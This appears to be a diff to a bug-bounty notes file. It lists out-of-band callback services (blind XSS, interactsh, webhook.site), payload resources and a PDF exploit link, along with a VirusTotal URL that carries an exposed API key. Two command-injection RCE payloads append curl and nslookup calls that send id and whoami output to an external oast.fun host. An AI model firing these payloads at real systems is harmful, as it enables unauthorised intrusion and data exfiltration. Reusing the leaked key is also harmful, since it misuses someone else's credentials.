@@ -2,6 +2,11 @@
 >> https://swisskyrepo.github.io/PayloadsAllTheThings/
 >> https://lostsec.xyz/
 
+CanaryTokens: https://canarytokens.org/nest/
+Blind XSS: https://xss0r.com/dashboard#payloads
+DNS: https://app.interactsh.com/#/
+Hook: https://webhook.site/
+
 https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original
 
 https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa22515a025e00df1e3bb2bc4f186b8e919558d576c&domain=example.com
@@ -68,10 +73,6 @@ PDF-prompt:
 https://raw.githubusercontent.com/coffinxp/pdFExploits/refs/heads/main/cookieprompt.pdf
 
 --------------------------------------------------------------------------------------------------------------------------
-
-CanaryTokens: https://canarytokens.org/nest/
-Blind XSS: https://xss0r.com/dashboard#payloads
-DNS: https://app.interactsh.com/#/
 
 RCE:  https://subdomain.domain.tld/emdpoint?param=value;curl https://leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun -X POST -d `id`
 RCE:  https://subdomain.domain.tld/emdpoint?param=value;nslookup `whoami`.leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun
